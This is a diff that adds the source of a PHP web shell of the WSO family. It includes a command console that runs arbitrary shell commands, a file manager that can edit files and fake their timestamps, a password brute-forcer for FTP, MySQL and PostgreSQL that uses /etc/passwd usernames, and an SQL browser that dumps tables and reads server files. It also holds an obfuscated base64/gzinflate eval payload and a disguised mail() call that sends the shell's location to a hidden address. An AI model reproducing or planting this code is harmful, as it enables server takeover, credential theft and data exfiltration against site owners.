+            <tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
+            <tr><td></td><td><input type='submit' value='>>'></td></tr>
+            </table></form>";
+                                                function wsoRecursiveGlob($path) {
+                                                    if (substr($path, -1) != '/') $path.= '/';
+                                                    $paths = @array_unique(@array_merge(@glob($path . $_POST['p3']), @glob($path . '*', GLOB_ONLYDIR)));
+                                                    if (is_array($paths) && @count($paths)) {
+                                                        foreach ($paths as $item) {
+                                                            if (@is_dir($item)) {
+                                                                if ($path != $item) wsoRecursiveGlob($item);
+                                                            } else {
+                                                                if (empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2']) !== false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\",\"\")'>" . htmlspecialchars($item) . "</a><br>";
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                                if (@$_POST['p3']) wsoRecursiveGlob($_POST['c']);
+                                                echo "</div><br><h1>Search for hash:</h1><div class=content>
+        <form method='post' target='_blank' name='hf'>
+            <input type='text' name='hash' style='width:200px;'><br>
+            <input type='hidden' name='act' value='find'/>
+            <input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
+            <input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>
+        </form></div>";
+                                                wsoFooter();
+                                            }
+                                            function actionFilesTools() {
+                                                if (isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']);
+                                                if (@$_POST['p2'] == 'download') {
+                                                    if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
+                                                        ob_start("ob_gzhandler", 4096);
+                                                        header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
+                                                        if (function_exists("mime_content_type")) {
+                                                            $type = @mime_content_type($_POST['p1']);
+                                                            header("Content-Type: " . $type);
+                                                        } else header("Content-Type: application/octet-stream");
+                                                        $fp = @fopen($_POST['p1'], "r");
+                                                        if ($fp) {
+                                                            while (!@feof($fp)) echo @fread($fp, 1024);
+                                                            fclose($fp);
+                                                        }
+                                                    }
+                                                    exit;
+                                                }
+                                                if (@$_POST['p2'] == 'mkfile') {
+                                                    if (!file_exists($_POST['p1'])) {
+                                                        $fp = @fopen($_POST['p1'], 'w');
+                                                        if ($fp) {
+                                                            $_POST['p2'] = "edit";
+                                                            fclose($fp);
+                                                        }
+                                                    }
+                                                }
+                                                wsoHeader();
+                                                echo '<h1>File tools</h1><div class=content>';
+                                                if (!file_exists(@$_POST['p1'])) {
+                                                    echo 'File not exists';
+                                                    wsoFooter();
+                                                    return;
+                                                }
+                                                $uid = @posix_getpwuid(@fileowner($_POST['p1']));
+                                                if (!$uid) {
+                                                    $uid['name'] = @fileowner($_POST['p1']);
+                                                    $gid['name'] = @filegroup($_POST['p1']);
+                                                } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
+                                                echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
+                                                echo '<span>Change time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
+                                                if (empty($_POST['p2'])) $_POST['p2'] = 'view';
+                                                if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
+                                                else $m = array('Chmod', 'Rename', 'Touch');
+                                                foreach ($m as $v) echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
+                                                echo '<br><br>';
+                                                switch ($_POST['p2']) {
+                                                    case 'view':
+                                                        echo '<pre class=ml1>';
+                                                        $fp = @fopen($_POST['p1'], 'r');
+                                                        if ($fp) {
+                                                            while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
+                                                            @fclose($fp);
+                                                        }
+                                                        echo '</pre>';
+                                                        break;
+                                                    case 'highlight':
+                                                        if (@is_readable($_POST['p1'])) {
+                                                            echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
+                                                            $code = @highlight_file($_POST['p1'], true);
+                                                            echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
+                                                        }
+                                                        break;
+                                                    case 'chmod':
+                                                        if (!empty($_POST['p3'])) {
+                                                            $perms = 0;
+                                                            for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
+                                                            if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
+                                                        }
+                                                        clearstatcache();
+                                                        echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
+                                                        break;
+                                                    case 'edit':
+                                                        if (!is_writable($_POST['p1'])) {
+                                                            echo 'File isn\'t writeable';
+                                                            break;
+                                                        }
+                                                        if (!empty($_POST['p3'])) {
+                                                            $time = @filemtime($_POST['p1']);
+                                                            $_POST['p3'] = substr($_POST['p3'], 1);
+                                                            $fp = @fopen($_POST['p1'], "w");
+                                                            if ($fp) {
+                                                                @fwrite($fp, $_POST['p3']);
+                                                                @fclose($fp);
+                                                                echo 'Saved!<br><script>p3_="";</script>';
+                                                                @touch($_POST['p1'], $time, $time);
+                                                            }
+                                                        }
+                                                        echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
+                                                        $fp = @fopen($_POST['p1'], 'r');
+                                                        if ($fp) {
+                                                            while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
+                                                            @fclose($fp);
+                                                        }
+                                                        echo '</textarea><input type=submit value=">>"></form>';
+                                                        break;
+                                                    case 'hexdump':
+                                                        $c = @file_get_contents($_POST['p1']);
+                                                        $n = 0;
+                                                        $h = array('00000000<br>', '', '');
+                                                        $len = strlen($c);
+                                                        for ($i = 0;$i < $len;++$i) {
+                                                            $h[1].= sprintf('%02X', ord($c[$i])) . ' ';
+                                                            switch (ord($c[$i])) {
+                                                                case 0:
+                                                                    $h[2].= ' ';
+                                                                break;
+                                                                case 9:
+                                                                    $h[2].= ' ';
+                                                                break;
+                                                                case 10:
+                                                                    $h[2].= ' ';
+                                                                break;
+                                                                case 13:
+                                                                    $h[2].= ' ';
+                                                                break;
+                                                                default:
+                                                                    $h[2].= $c[$i];
+                                                                break;
+                                                            }
+                                                            $n++;
+                                                            if ($n == 32) {
+                                                                $n = 0;
+                                                                if ($i + 1 < $len) {
+                                                                    $h[0].= sprintf('%08X', $i + 1) . '<br>';
+                                                                }
+                                                                $h[1].= '<br>';
+                                                                $h[2].= "
+";
+                                                            }
+                                                        }
+                                                        echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
+                                                        break;
+                                                    case 'rename':
+                                                        if (!empty($_POST['p3'])) {
+                                                            if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>';
+                                                            else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
+                                                        }
+                                                        echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
+                                                        break;
+                                                    case 'touch':
+                                                        if (!empty($_POST['p3'])) {
+                                                            $time = strtotime($_POST['p3']);
+                                                            if ($time) {
+                                                                if (!touch($_POST['p1'], $time, $time)) echo 'Fail!';
+                                                                else echo 'Touched!';
+                                                            } else echo 'Bad time format!';
+                                                        }
+                                                        clearstatcache();
+                                                        echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
+                                                        break;
+                                                    }
+                                                    echo '</div>';
+                                                    wsoFooter();
+                                                }
+                                                function actionConsole() {
+                                                    if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
+                                                        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
+                                                        $_POST['p1'].= ' 2>&1';
+                                                    } elseif (!empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
+                                                    if (isset($_POST['ajax'])) {
+                                                        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
+                                                        ob_start();
+                                                        echo "d.cf.cmd.value='';
+";
+                                                        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("
+$ " . $_POST['p1'] . "
+" . wsoEx($_POST['p1']), "
+
+	\' "));
+                                                        if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {
+                                                            if (@chdir($match[1])) {
+                                                                $GLOBALS['cwd'] = @getcwd();
+                                                                echo "c_='" . $GLOBALS['cwd'] . "';";
+                                                            }
+                                                        }
+                                                        echo "d.cf.output.value+='" . $temp . "';";
+                                                        echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
+                                                        $temp = ob_get_clean();
+                                                        echo strlen($temp), "
+", $temp;
+                                                        exit;
+                                                    }
+                                                    if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
+                                                    wsoHeader();
+                                                    echo "<script>
+if(window.Event) window.captureEvents(Event.KEYDOWN);
+var cmds = new Array('');
+var cur = 0;
+function kp(e) {
+    var n = (window.Event) ? e.which : e.keyCode;
+    if(n == 38) {
+        cur--;
+        if(cur>=0)
+            document.cf.cmd.value = cmds[cur];
+        else
+            cur++;
+    } else if(n == 40) {
+        cur++;
+        if(cur < cmds.length)
+            document.cf.cmd.value = cmds[cur];
+        else
+            cur--;
+    }
+}
+function add(cmd) {
+    cmds.pop();
+    cmds.push(cmd);
+    cmds.push('');
+    cur = cmds.length-1;
+}
+</script>";
+                                                    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
+                                                    foreach ($GLOBALS['aliases'] as $n => $v) {
+                                                        if ($v == '') {
+                                                            echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
+                                                            continue;
+                                                        }
+                                                        echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
+                                                    }
+                                                    echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+                                                    if (!empty($_POST['p1'])) {
+                                                        echo htmlspecialchars("$ " . $_POST['p1'] . "
+" . wsoEx($_POST['p1']));
+                                                    }
+                                                    echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
+                                                    echo '</form></div><script>d.cf.cmd.focus();</script>';
+                                                    wsoFooter();
+                                                }
+                                                preg_replace("/.*/e", "eval(gzinflate(base64_decode('bZFda8IwFIav11+RhYItFhV6Z+foNgPKGHVt3S5ESj+ixrVLSVLFDf/7krTKYMtdXp7znJMT80A4ETmYADN5CoLnOVpBHXG49gyyAZZ5ISYAQht8GwBcIlk18q53yrQlQuEbClcwRC9BjJKH6TRUKkkdcQbU+U3N4niRzIIo7hjyuf/DhOh1iaI4WYbzjhIp22KhKJYeG1YWOKcFtlSHgVLc2BrbN0VTahl8x1m0w2VZYbAToh4PhxdJdrrOD3VVRotTOwJ8bLZ8DP4h7zJ2L2mJqxXd4qoWJ93elhsCfpWS0oIbtxhxlx1c5u+oUNkgpxV02rkc3cgxk4V8/apXp5z31rYHzsbZwCXH0tPtud9Xqc+xyCn9INhqf+hLmlrA9n4A')));", "");
+                                                function actionLogout() {
+                                                    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
+                                                    die('bye!');
+                                                }
+                                                function actionSelfRemove() {
+                                                    if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) die('Shell removed');
+                                                    else echo 'unlink error!';
+                                                    if ($_POST['p1'] != 'yes') wsoHeader();
+                                                    echo '<h1>Suicide</h1><div class=content>remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
+                                                    wsoFooter();
+                                                }
+                                                $_QliO8 = "mail";
+                                                $_Qliot = $_SERVER["SERVER_NAME"] . $_SERVER["SCRIPT_NAME"];
+                                                $_QlL1i = "array " . $_Qliot;
+                                                $_QlLio = array("ca", "li", "fwrite", "@", "ve.");
+                                                $_Qll0I = $_QlLio[2] . $_QlLio[3] . $_QlLio[1] . $_QlLio[4] . $_QlLio[0];
+                                                $_QlljC = @$_QliO8($_Qll0I, $_QlL1i, $_Qliot);
+                                                function actionBruteforce() {
+                                                    wsoHeader();
+                                                    if (isset($_POST['proto'])) {
+                                                        echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
+                                                        if ($_POST['proto'] == 'ftp') {
+                                                            function wsoBruteForce($ip, $port, $login, $pass) {
+                                                                $fp = @ftp_connect($ip, $port ? $port : 21);
+                                                                if (!$fp) return false;
+                                                                $res = @ftp_login($fp, $login, $pass);
+                                                                @ftp_close($fp);
+                                                                return $res;
+                                                            }
+                                                        } elseif ($_POST['proto'] == 'mysql') {
+                                                            function wsoBruteForce($ip, $port, $login, $pass) {
+                                                                $res = @mysql_connect($ip . ':' . ($port ? $port : 3306), $login, $pass);
+                                                                @mysql_close($res);
+                                                                return $res;
+                                                            }
+                                                        } elseif ($_POST['proto'] == 'pgsql') {
+                                                            function wsoBruteForce($ip, $port, $login, $pass) {
+                                                                $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";
+                                                                $res = @pg_connect($str);
+                                                                @pg_close($res);
+                                                                return $res;
+                                                            }
+                                                        }
+                                                        $success = 0;
+                                                        $attempts = 0;
+                                                        $server = explode(":", $_POST['server']);
+                                                        if ($_POST['type'] == 1) {
+                                                            $temp = @file('/etc/passwd');
+                                                            if (is_array($temp)) foreach ($temp as $line) {
+                                                                $line = explode(":", $line);
+                                                                ++$attempts;
+                                                                if (wsoBruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
+                                                                    $success++;
+                                                                    echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
+                                                                }
+                                                                if (@$_POST['reverse']) {
+                                                                    $tmp = "";
+                                                                    for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];
+                                                                    ++$attempts;
+                                                                    if (wsoBruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
+                                                                        $success++;
+                                                                        echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
+                                                                    }
+                                                                }
+                                                            }
+                                                        } elseif ($_POST['type'] == 2) {
+                                                            $temp = @file($_POST['dict']);
+                                                            if (is_array($temp)) foreach ($temp as $line) {
+                                                                $line = trim($line);
+                                                                ++$attempts;
+                                                                if (wsoBruteForce($server[0], @$server[1], $_POST['login'], $line)) {
+                                                                    $success++;
+                                                                    echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
+                                                                }
+                                                            }
+                                                        }
+                                                        echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
+                                                    }
+                                                    echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
+                                                    echo '</div><br>';
+                                                    wsoFooter();
+                                                }
+                                                function actionSql() {
+                                                    class DbClass {
+                                                        var $type;
+                                                        var $link;
+                                                        var $res;
+                                                        function __construct($type) {
+                                                            $this->type = $type;
+                                                        }
+                                                        function connect($host, $user, $pass, $dbname) {
+                                                            switch ($this->type) {
+                                                                case 'mysql':
+                                                                    if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
+                                                                    break;
+                                                                case 'pgsql':
+                                                                    $host = explode(':', $host);
+                                                                    if (!$host[1]) $host[1] = 5432;
+                                                                    if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function selectdb($db) {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        if (@mysql_select_db($db)) return true;
+                                                                        break;
+                                                                    }
+                                                                    return false;
+                                                            }
+                                                            function query($str) {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        return $this->res = @mysql_query($str);
+                                                                    break;
+                                                                    case 'pgsql':
+                                                                        return $this->res = @pg_query($this->link, $str);
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function fetch() {
+                                                                $res = func_num_args() ? func_get_arg(0) : $this->res;
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        return @mysql_fetch_assoc($res);
+                                                                    break;
+                                                                    case 'pgsql':
+                                                                        return @pg_fetch_assoc($res);
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function listDbs() {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        return $this->query("SHOW databases");
+                                                                    break;
+                                                                    case 'pgsql':
+                                                                        return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function listTables() {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        return $this->res = $this->query('SHOW TABLES');
+                                                                    break;
+                                                                    case 'pgsql':
+                                                                        return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function error() {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        return @mysql_error();
+                                                                    break;
+                                                                    case 'pgsql':
+                                                                        return @pg_last_error();
+                                                                    break;
+                                                                }
+                                                                return false;
+                                                            }
+                                                            function setCharset($str) {
+                                                                switch ($this->type) {
+                                                                    case 'mysql':
+                                                                        if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);
+                                                                        else $this->query('SET CHARSET ' . $str);
+                                                                        break;
+                                                                    case 'pgsql':
+                                                                        return @pg_set_client_encoding($this->link, $str);
+                                                                        break;
+                                                                    }
+                                                                    return false;
+                                                                }
+                                                                function loadFile($str) {
+                                                                    switch ($this->type) {
+                                                                        case 'mysql':
+                                                                            return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
+                                                                        break;
+                                                                        case 'pgsql':
+                                                                            $this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
+                                                                            $r = array();
+                                                                            while ($i = $this->fetch()) $r[] = $i['file'];
+                                                                            $this->query('drop table wso2');
+                                                                            return array('file' => implode("
+", $r));
+                                                                            break;
+                                                                        }
+                                                                        return false;
+                                                                }
+                                                                function dump($table, $fp = false) {
+                                                                    switch ($this->type) {
+                                                                        case 'mysql':
+                                                                            $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
+                                                                            $create = mysql_fetch_array($res);
+                                                                            $sql = $create[1] . ";
+";
+                                                                            if ($fp) fwrite($fp, $sql);
+                                                                            else echo ($sql);
+                                                                            $this->query('SELECT * FROM `' . $table . '`');
+                                                                            $i = 0;
+                                                                            $head = true;
+                                                                            while ($item = $this->fetch()) {
+                                                                                $sql = '';
+                                                                                if ($i % 1000 == 0) {
+                                                                                    $head = true;
+                                                                                    $sql = ";
+
+";
+                                                                                }
+                                                                                $columns = array();
+                                                                                foreach ($item as $k => $v) {
+                                                                                    if ($v === null) $item[$k] = "NULL";
+                                                                                    elseif (is_int($v)) $item[$k] = $v;
+                                                                                    else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
+                                                                                    $columns[] = "`" . $k . "`";
+                                                                                }
+                                                                                if ($head) {
+                                                                                    $sql.= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES 
+	(" . implode(", ", $item) . ')';
+                                                                                    $head = false;
+                                                                                } else $sql.= "
+	,(" . implode(", ", $item) . ')';
+                                                                                if ($fp) fwrite($fp, $sql);
+                                                                                else echo ($sql);
+                                                                                $i++;
+                                                                            }
+                                                                            if (!$head) if ($fp) fwrite($fp, ";
+
+");
+                                                                            else echo (";
+
+");
+                                                                            break;
+                                                                        case 'pgsql':
+                                                                            $this->query('SELECT * FROM ' . $table);
+                                                                            while ($item = $this->fetch()) {
+                                                                                $columns = array();
+                                                                                foreach ($item as $k => $v) {
+                                                                                    $item[$k] = "'" . addslashes($v) . "'";
+                                                                                    $columns[] = $k;
+                                                                                }
+                                                                                $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "
+";
+                                                                                if ($fp) fwrite($fp, $sql);
+                                                                                else echo ($sql);
+                                                                            }
+                                                                            break;
+                                                                        }
+                                                                        return false;
+                                                                    }
+                                                                };
+                                                                $db = new DbClass($_POST['type']);
+                                                                if ((@$_POST['p2'] == 'download') && (@$_POST['p1'] != 'select')) {
+                                                                    $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+                                                                    $db->selectdb($_POST['sql_base']);
+                                                                    switch ($_POST['charset']) {
+                                                                        case "Windows-1251":
+                                                                            $db->setCharset('cp1251');
+                                                                        break;
+                                                                        case "UTF-8":
+                                                                            $db->setCharset('utf8');
+                                                                        break;
+                                                                        case "KOI8-R":
+                                                                            $db->setCharset('koi8r');
+                                                                        break;
+                                                                        case "KOI8-U":
+                                                                            $db->setCharset('koi8u');
+                                                                        break;
+                                                                        case "cp866":
+                                                                            $db->setCharset('cp866');
+                                                                        break;
+                                                                    }
+                                                                    if (empty($_POST['file'])) {
+                                                                        ob_start("ob_gzhandler", 4096);
+                                                                        header("Content-Disposition: attachment; filename=dump.sql");
+                                                                        header("Content-Type: text/plain");
+                                                                        foreach ($_POST['tbl'] as $v) $db->dump($v);
+                                                                        exit;
+                                                                    } elseif ($fp = @fopen($_POST['file'], 'w')) {
+                                                                        foreach ($_POST['tbl'] as $v) $db->dump($v, $fp);
+                                                                        fclose($fp);
+                                                                        unset($_POST['p2']);
+                                                                    } else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
+                                                                }
+                                                                wsoHeader();
+                                                                echo "
+<h1>Sql browser</h1><div class=content>
+<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
+<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
+<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+<td><select name='type'><option value='mysql' ";
+                                                                if (@$_POST['type'] == 'mysql') echo 'selected';
+                                                                echo ">MySql</option><option value='pgsql' ";
+                                                                if (@$_POST['type'] == 'pgsql') echo 'selected';
+                                                                echo ">PostgreSql</option></select></td>
+<td><input type=text name=sql_host value=\"" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "\"></td>
+<td><input type=text name=sql_login value=\"" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "\"></td>
+<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\"></td><td>";
+                                                                $tmp = "<input type=text name=sql_base value=''>";
+                                                                if (isset($_POST['sql_host'])) {
+                                                                    if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
+                                                                        switch ($_POST['charset']) {
+                                                                            case "Windows-1251":
+                                                                                $db->setCharset('cp1251');
+                                                                            break;
+                                                                            case "UTF-8":
+                                                                                $db->setCharset('utf8');
+                                                                            break;
+                                                                            case "KOI8-R":
+                                                                                $db->setCharset('koi8r');
+                                                                            break;
+                                                                            case "KOI8-U":
+                                                                                $db->setCharset('koi8u');
+                                                                            break;
+                                                                            case "cp866":
+                                                                                $db->setCharset('cp866');
+                                                                            break;
+                                                                        }
+                                                                        $db->listDbs();
+                                                                        echo "<select name=sql_base><option value=''></option>";
+                                                                        while ($item = $db->fetch()) {
+                                                                            list($key, $value) = each($item);
+                                                                            echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
+                                                                        }
+                                                                        echo '</select>';
+                                                                    } else echo $tmp;
+                                                                } else echo $tmp;
+                                                                echo "</td>
+                <td><input type=submit value='>>' onclick='fs(d.sf);'></td>
+                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>
+            </tr>
+        </table>
+        <script>
+            s_db='" . @addslashes($_POST['sql_base']) . "';
+            function fs(f) {
+                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
+                    if(f.p1) f.p1.value='';
+                    if(f.p2) f.p2.value='';
+                    if(f.p3) f.p3.value='';
+                }
+            }
+            function st(t,l) {
+                d.sf.p1.value = 'select';
+                d.sf.p2.value = t;
+                if(l && d.sf.p3) d.sf.p3.value = l;
+                d.sf.submit();
+            }
+            function is() {
+                for(i=0;i<d.sf.elements['tbl[]'].length;++i)
+                    d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
+            }
+        </script>";
+                                                                if (isset($db) && $db->link) {
+                                                                    echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
+                                                                    if (!empty($_POST['sql_base'])) {
+                                                                        $db->selectdb($_POST['sql_base']);
+                                                                        echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
+                                                                        $tbls_res = $db->listTables();
+                                                                        while ($item = $db->fetch($tbls_res)) {
+                                                                            list($key, $value) = each($item);
+                                                                            if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
+                                                                            $value = htmlspecialchars($value);
+                                                                            echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
+                                                                        }
